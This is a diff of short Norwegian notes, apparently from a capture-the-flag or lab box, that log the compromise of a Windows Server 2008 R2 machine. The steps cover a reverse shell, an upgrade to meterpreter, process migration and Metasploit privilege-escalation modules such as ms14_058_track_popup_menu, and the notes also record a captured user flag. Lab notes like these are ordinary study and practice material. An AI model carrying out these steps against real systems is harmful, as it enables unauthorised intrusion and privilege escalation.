@@ -42,9 +42,9 @@ systeminfo, **server 2008 r2 x64**, dual processor
 
 måtte så klart spawne et **windows reverse shell se under**
 
-8.p**hp **var den som virket kanskje tror jeg
 
-eller 7?
+
+ **7.php virker**
 
 bruke
 
@@ -54,9 +54,7 @@ først reverse shell, så opgpradere til meterpreter
 
 use post/multi/manage/shell\_to\_meterpreter
 
-set lport 4434 - dno hvorfor er noe galt med 4433
-
-gjøre om fra 32 til 64 bit meterpreter = execute -f "c:\windows\sysnative\notepad.exe" og migrate til den pid-en
+**gjøre om fra 32 til 64 bit meterpreter = execute -f "c:\windows\sysnative\notepad.exe" og migrate til den pid-en**
 
 exploit/windows/local/ms10\_092\_schelevator - funket ikke
 
@@ -68,5 +66,11 @@ user.txt **ba22fde1932d06eb76a163d312f921a2**
 
 prøvd token impersonation rottentpotato. no work
 
-**trenger å finne post exp**
+use exploit suggester with x86 to reveal some which also work on x64
+
+**use exploit/windows/local/ms14\_058\_track\_popup\_menu**
+
+set target 1 \(x64\)
+
+set payload x64 meterpreter - ikke nødvendig
 
